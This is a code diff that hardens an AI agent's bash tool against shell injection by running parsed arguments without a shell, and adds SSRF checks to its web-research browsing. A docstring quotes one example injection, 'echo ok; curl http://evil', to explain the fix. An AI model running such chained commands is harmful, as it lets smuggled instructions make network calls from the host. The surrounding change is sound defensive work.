@@ -40,6 +40,8 @@ os.environ.setdefault("ORT_DISABLE_GPU", "1")
 
 import httpx
 
+from agent_safety import CommandRejected, check_bash_command, is_public_url
+
 logger = logging.getLogger(__name__)
 
 # ── Optional OTEL / Arize Phoenix instrumentation ────────────────────────────
@@ -1673,15 +1675,23 @@ async def _ha_control(entity_id: str, action: str, data: dict | None = None) -> 
 # ── Bash self-extension ───────────────────────────────────────────────────────
 
 async def _bash(command: str) -> str:
-    """Run an allowed bash command and return stdout (max 2000 chars)."""
-    # Safety check — only whitelisted prefixes allowed
-    cmd_stripped = command.strip()
-    if not any(cmd_stripped.startswith(pfx) for pfx in _BASH_ALLOWED_PREFIXES):
-        return f"[bash blocked: '{cmd_stripped[:40]}' is not in the allowed command list]"
+    """Run an allowed bash command and return stdout (max 2000 chars).
+
+    Safety: the command is validated against the prefix allowlist AND parsed
+    into an argv list (``agent_safety.check_bash_command``), then executed with
+    ``create_subprocess_exec`` — i.e. NO shell. This neutralises shell-injection
+    (``echo ok; curl http://evil`` no longer chains commands: ``curl`` becomes
+    an inert literal argument to ``echo``), while every legitimate allowlisted
+    command still works.
+    """
+    try:
+        argv = check_bash_command(command, _BASH_ALLOWED_PREFIXES)
+    except CommandRejected as exc:
+        return f"[bash blocked: {exc}]"
     try:
         proc = await asyncio.wait_for(
-            asyncio.create_subprocess_shell(
-                cmd_stripped,
+            asyncio.create_subprocess_exec(
+                *argv,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
             ),
@@ -2293,8 +2303,17 @@ async def _web_research(query: str, user_id: str = "") -> str:
             flow (postcode → dropdown → confirm), search within site if on a homepage."""
             page = None
             try:
+                # SSRF guard: only follow result links that resolve to public
+                # addresses — never loopback / LAN / cloud-metadata targets.
+                if not is_public_url(url):
+                    logger.warning("web_research: blocked non-public URL %s", url[:80])
+                    return ""
                 page = await ctx.new_page()
                 await page.goto(url, wait_until="domcontentloaded", timeout=12000)
+                # Re-check after redirects: a public URL may 30x to an internal one.
+                if not is_public_url(page.url):
+                    logger.warning("web_research: blocked redirect to non-public URL %s", page.url[:80])
+                    return ""
                 # Let JS settle before any interaction
                 await page.wait_for_timeout(800)
                 await _dismiss_overlays(page)
